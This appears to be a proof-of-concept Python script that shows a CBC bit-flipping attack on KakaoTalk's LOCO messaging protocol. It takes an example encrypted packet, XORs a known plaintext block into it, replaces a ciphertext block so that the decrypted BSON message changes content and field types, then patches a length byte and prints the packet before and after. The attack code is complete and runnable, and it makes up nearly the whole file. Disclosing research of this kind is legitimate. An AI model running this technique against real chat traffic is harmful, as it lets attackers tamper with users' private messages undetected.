import bson
from lib.crypto_utils import aes_decrypt
from lib.loco_parser import LocoParser

# Hexdump of the LOCO packet used here as an example
_HEXDUMP = """
  Offset  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000  8A 80 CE 0E 00 00 4D 53 47 00 00 00 00 00 00 00  ......MSG.......
00000010  00 08 DD 00 00 00 DD 00 00 00 10 73 74 61 74 75  ...........statu
00000020  73 00 00 00 00 00 12 63 68 61 74 49 64 00 E8 41  s......chatId..A
00000030  38 DB 75 51 01 00 12 6C 6F 67 49 64 00 01 58 8F  8.uQ...logId..X.
00000040  72 CE 1E 3C 2A 03 63 68 61 74 4C 6F 67 00 9B 00  r..<*.chatLog...
00000050  00 00 12 6C 6F 67 49 64 00 01 58 8F 72 CE 1E 3C  ...logId..X.r..<
00000060  2A 12 63 68 61 74 49 64 00 E8 41 38 DB 75 51 01  *.chatId..A8.uQ.
00000070  00 10 74 79 70 65 00 01 00 00 00 12 61 75 74 68  ..type......auth
00000080  6F 72 49 64 00 1A FB DD 17 00 00 00 00 02 6D 65  orId..........me
00000090  73 73 61 67 65 00 27 00 00 00 41 41 41 41 41 41  ssage.'...AAAAAA
000000A0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000000B0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000000C0  00 10 73 65 6E 64 41 74 00 2C B5 5B 64 10 6D 73  ..sendAt.,.[d.ms
000000D0  67 49 64 00 73 BC 22 32 12 70 72 65 76 49 64 00  gId.s."2.prevId.
000000E0  00 58 8F 8E AC 1E 3C 2A 00 08 6E 6F 53 65 65 6E  .X....<*..noSeen
000000F0  00 00 00
"""

_CIPHERTEXT = b"\xeb.\xbc\x0e\x9eHr3\xd4n]\x97\x9c{;\xa77\x7f\x94\x1b\xf7\xba\x126\xa32\xe2\x89\xe8\xa4-S\xf9\x80\r\x17kn\x15\x97\xa6\xe5\x8d\xd1\nE\xb1\xd9\xec\xb1`O\x86\xce\x1e\xbc\xa7\x99\x1c\xc2\x8au\xa0a\x04\x03\xacj<L\xe7D\x91\x82\xbb\xa4\xc5\xcb\x89\x0e\xd17\xb9\x90R\xc8;\x95+\xd5\xfb\xd4\xf2\x03`\xcdF\xc8\xc1\x0b\xe08\xbaY\r\x86S\xd0.\xca\xf6\xce\xdc\xf9\x11\xc1\xbdV\xcf\xd4S\x8db\xff\xfb\xb4x\xc6\xfe4\x05\xe2T6\xc7j\xb7\x1f\t\x18o;\xfb\xad\xc8\x86\x8f'1$\xfe\xdc\xf3O\xd8?e\x84[\xbcR\\\xac\x82f'\x02\xf1\x11\xda\xf5/\x8c\x91\xfc\xe01\x8e\xf3!\xf7\xd4\x12\ts\x82\t\xe7_f\x15\x8ev\xf6c)\r\x0b\xb8\xee\x9cZc8W\xd6/m?\x7f\xe7S:4\xd1ud4\x18{f\x07\xb8\xfa\xbd\x10f\x96\x18\x88\xe2\x17]\xce\xd2\xdbK1\xcf\xd4\x91N\\"
_IV = b"g\xedV]\x84M\x9e\xb0\xe6\x83X\x98x\x80\xd0]"


def xor(param1, param2):
    return bytes((x ^ y) for (x, y) in zip(param1, param2))


if __name__ == "__main__":
    parser = LocoParser()
    # The known plaintext of the 11th block
    known_plaintext_block_11 = b"AAAAAAAAAAAAAAAA"
    ciphertext_block_11 = _CIPHERTEXT[0xA0 : 0xA0 + 0x10]

    # XOR the two blocks
    x = xor(ciphertext_block_11, known_plaintext_block_11)

    # As the 12th block will be garbled after modification, we tell the BSON decoder to treat it as binary data
    # \x00 -> null terminator
    # \x05 -> 0x05 = type binary data
    # \x00 -> null terminator
    # \x11\x00\x00\x00\x00 -> field value size (which is 17 including the null terminator)
    # See https://en.wikipedia.org/wiki/BSON
    target_plaintext_block_11 = b"BBBBBBBB\x00\x05\x00\x11\x00\x00\x00\x00"

    # XOR again
    ciphertext_block_11_new = xor(x, target_plaintext_block_11)

    # Replace the 11th block with the new block
    modified_ciphertext = bytearray(_CIPHERTEXT)
    modified_ciphertext[0xA0 : 0xA0 + 0x10] = ciphertext_block_11_new

    # Decrypt the modified ciphertext and let the bits flip
    modified_packet = aes_decrypt(modified_ciphertext, _IV)
    loco_packet = parser.parse_loco_packet(modified_packet)
    loco_body = bytearray(loco_packet.body_payload)

    # Patch the size of the "message" field value from 39 to 15
    # Python's BSON decoder requires this
    # KakaoTalk's BSON parser doesn't
    loco_body[128:129] = b"\x0F"

    # Print the packet before bit flipping
    unmodified_packet = aes_decrypt(_CIPHERTEXT, _IV)
    unmodified_body = parser.parse_loco_packet(unmodified_packet).body_payload
    print(bson.loads(bytes(unmodified_body)))

    # Print the packet after it
    print(bson.loads(bytes(loco_body)))
